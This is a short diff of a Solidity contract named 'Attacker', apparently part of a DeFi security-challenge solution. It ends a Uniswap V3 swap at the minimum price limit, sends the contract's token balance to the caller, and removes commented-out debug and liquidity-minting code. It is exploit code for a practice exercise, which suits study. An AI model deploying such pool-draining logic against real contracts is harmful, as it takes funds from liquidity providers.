@@ -40,32 +40,7 @@ contract Attacker {
                             amountSpecified: amount,
                             sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO+1,
                             data: ""});
-        uint256 amount = token1.balanceOf(address(this));
-        token1.transfer(msg.sender, amount);
-        // emit Transfer(address(this), msg.sender, amount);
+        token1.transfer(msg.sender, token1.balanceOf(address(this)));
     }
-
-    
-
-        // positionmanager.mint(
-        //     INonfungiblePositionManager.MintParams({
-        //         token0: address(token0),
-        //         token1: address(token1),
-        //         tickLower: -75000-60,
-        //         tickUpper: -75000+60,
-        //         fee: 3000,
-        //         recipient: address(this),
-        //         amount0Desired: 10e18,
-        //         amount1Desired: 5532918018494444,
-        //         amount0Min: 0,
-        //         amount1Min: 0,
-        //         deadline: block.timestamp
-        //     })
-        // );
-        // console.log("dvt", token0.balanceOf(address(this)));
-        // console.log("weth", token1.balanceOf(address(this)));
-        // uint256 amount = token1.balanceOf(address(this));
-        // token1.transfer(msg.sender, amount);
-        // emit Transfer(address(this), msg.sender, amount);
    
 }
